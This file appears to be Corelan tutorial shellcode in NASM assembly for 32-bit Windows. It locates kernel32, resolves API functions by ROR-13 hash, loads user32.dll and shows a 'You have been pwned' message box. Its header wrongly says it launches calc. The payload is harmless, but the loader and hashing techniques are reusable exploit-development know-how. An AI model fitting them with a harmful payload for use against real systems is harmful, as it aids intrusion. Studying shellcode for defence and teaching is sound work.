; Sample shellcode that will execute calc
; Written by Peter Van Eeckhoutte
; http://www.corelan.be:8800
; slight formatting changes by @xenoscr

[Section .text]
[BITS 32]

global _start

_start:

	jmp start_main

; ==============FUNCTIONS===============

; ==========Function : Get Kernel32 base address==========
; Topstack technique
; get kernel32 and place address in eax
find_kernel32:
	push esi				; Save ESI
	xor esi, esi				; Zero ESI
	mov eax, [fs:esi+0x04]			; Extract TEB
	mov eax, [eax-0x1C]			; Snag a function pointer that's 0x1C bytes into the stack
find_kernel32_base:
find_kernel32_base_loop:
	dec eax					; Subtract to our next page
	xor ax, ax				; Zero the lower half
	cmp word [eax], 0x5A4D			; Is this the top of kernel32?
	jne find_kernel32_base_loop		; Nope? Try again.
find_kernel32_base_finished:
	pop esi
	ret

; =========Function : Find function base address==========
find_function:
	pushad					; save all registers
	mov ebp, [esp+0x24]			; put base address of module that is being loaded in ebp
	mov eax, [ebp+0x3C]			; skip over MSDOS header
	mov edx, [ebp+eax+0x78]			; go to export table and put relative address in ebx
	add edx, ebp				; add base address to it. EBX = absoute address of export table
	mov ecx, [edx+0x18]			; set up counter ECX
	mov ebx, [edx+0x20]			; put names table relative to offset in EBX
	add ebx, ebp				; add base address to it

find_function_loop:
	jecxz find_function_finished		; if ECX=0, then last symbol has been checked. (should never happen, unless function could not be found)
	dec ecx					; ECX=ECX-1
	mov esi, [ebx+ecx*4]			; get relative offset of the name associated with the current symbol and store offset in ESI
	add esi, ebp				; add base address

compute_hash:
	xor edi, edi				; Zero out EDI
	xor eax, eax				; Zero out EAX
	cld					; clear direction flag. will make sure that it increments instead of decrements when using lods*

compute_hash_again:
	lodsb					; load bytes at ESI (current symbol name) into al, + increment esi
	test al, al				; bitwise test: see if end of string has been reached
	jz compute_hash_finished		; if zero flag is set = end of string reached
	ror edi, 0x0D				; if zero flag is not set, rotate current value of hash 13 bits to the right
	add edi, eax				; add current character of symbol name to hash accumulator
	jmp compute_hash_again			; continue loop

compute_hash_finished:
find_function_compare:
	cmp edi, [esp+0x28]			; see if computed hash matches requested hash (at ESP+0x28). EDI = current computed hash, ESI = current function name (string)
	jnz find_function_loop			; no match, go to net symbol
	mov ebx, [edx+0x24]			; if match : extract ordinals table
	add ebx, ebp				; add base address. EBX = absolute address of ordinals address table
	mov cx, [ebx+2*ecx]			; get current symbol ordinals address table
	mov ebx, [edx+0x1C]			; get address table relative and put in ebx
	add ebx, ebp				; add base address. EBX = absolute address of address table
	mov eax, [ebx+4*ecx]			; get relative function offset from its ordinal and put in EAX
	add eax, ebp				; add base address. EAX = absolute address of function address
	mov [esp+0x1C], eax			; overwrite stack copy of eax so popad
find_function_finished:
	popad					; retrieve original registers.
	ret					; EAX will contain function address

; ========Function : loop to lookup functions (process all hashes)========
find_funcs_for_dll:
	lodsd					; load current hash into eax (pointed to by ESI)
	push eax				; push hash to stack
	push edx				; push base address of dll to stack
	call find_function
	mov [edi], eax				; write function pointer into address at EDI
	add esp, 0x08
	add edi, 0x04				; increase edi to store next pointer
	cmp esi, ecx				; did we process all hashes
	jne find_funcs_for_dll			; get next hash and lookup function pointer
find_funcs_for_dll_finished:
	ret

; =======Function : Get pointer to MessagBox Title=======================
GetTitle:					; Define label for location of tile string
	call TitleReturn			; call return label so the return address (location ofstring) is pushed onto the stack.
	db "Corelan"				; Write the raw bytes into the shellcode
	db 0x00					; Terminate our string with a null character

; =======Function : Get pointer to MessageBox Text=======================
GetText:					; Define label for location of text string
	call TextReturn				; call return label so the return address (location of string) is pushed onto the stack.
	db "You have been pwned by Corelan"	; Write the raw bytes into the shellcode
	db 0x00					; Terminate our string with a null character

; =======Function : Get pointer to user32.dll text=======================
GetUser32:					; Define label for locationof user32.dll string
	call User32Return			; call return label so the return address (location of string) is pushed onto the stack.
	db "user32.dll"				; Write the raw bytes into the shellcode
	db 0x00					; Terminate our string with a null character

; =======Function : Get pointers to funchtion hashes=====================

GetHashes:
	call GetHashesReturn
	; LoadLibraryA	hash : 0x8E4E0EEC
	db 0x8E
	db 0x4E
	db 0x0E
	db 0xEC

	; ExitProcess	hash : 0x7ED8E273
	db 0x7E
	db 0xD8
	db 0xE2
	db 0x73

GetMsgBoxHash:
	call GetMsgBoxHashReturn
	; MessageBoxA	hash : 0xA8A24DBC
	db 0xA8
	db 0xA2
	db 0x4D
	db 0xBC

; ========================================================================
; ====================== MAIN APPLICATION ================================
; ========================================================================

start_main:
	sub esp, 0x08				; allocate space on stack to store 2 function addresses: LoadLibrary; ExitProc
	mov ebp, esp				; set EBP as frame ptr for relative offset so we will be able to do this: call ebp+4, WinExec and call ebp+8, ExitProcess
	call find_kernel32
	mov edx, eax				; save base address of kernel32 in EDX

; =========Locate kernel32 APIs first=====================================
	jmp GetHashes				; get address of WinExec hash
GetHashesReturn:
	pop esi					; get pointer to hash into ESI
	lea edi, [ebp+0x04]			; we will store the function address at EDI. (EDI will be increased with 0x04 for each hash), (see resolve_symbols_for_dll)
	mov ecx, esi
	add ecx, 0x08				; store address of last hash into ECX
	call find_funcs_for_dll			; get function pointers for all hashes

; ========Load user32.dll=================================================
	jmp GetUser32				; First put pointer to "user32.dll" string onto stack
User32Return:					; Pointer to "user32.dll" is now on top of stack
	call [ebp+4]				; LoadLibrary("user32.dll")
	mov edx, eax				; Put the base address of user32.dll into edx

; =======Find the MessageBoxA function====================================
	jmp 	GetMsgBoxHash
GetMsgBoxHashReturn:				; Pointer to MessageBoxA hash now on top of stack
	pop esi					; Load the hash into ESI
	lodsd					; load current hash into EAX (pointed to by ESI)
	push eax				; push the hash to the stack
	push edx				; push the base address of user32.dll to stack
	call find_function			; Find the function address and load it into EAX

; now push parameters to the stack
	jmp GetTitle				; jump to the location of the MsgBox Title string
TitleReturn:					; Define a label to call so that string address is pushed on stack
	pop ebx					; EBX now points to Title string
	jmp GetText				; jump to the location of the MsgBox Text string
TextReturn:					; Define a label to call so that string address is pushed on stack
	pop ecx					; ECX now points to Text string

; now push parameters to the stack
	xor edx, edx				; Zero out EDX
	push edx				; uType = 0
	push ebx				; lpCaption = Title
	push ecx				; lpText = Text
	push edx				; hWnd = NULL
	call eax				; MessageBoxA(NULL, Text, Title, 0)

xor eax, eax					; Zero out EAX
push eax
call [ebp+8]					; Call ExitProcess
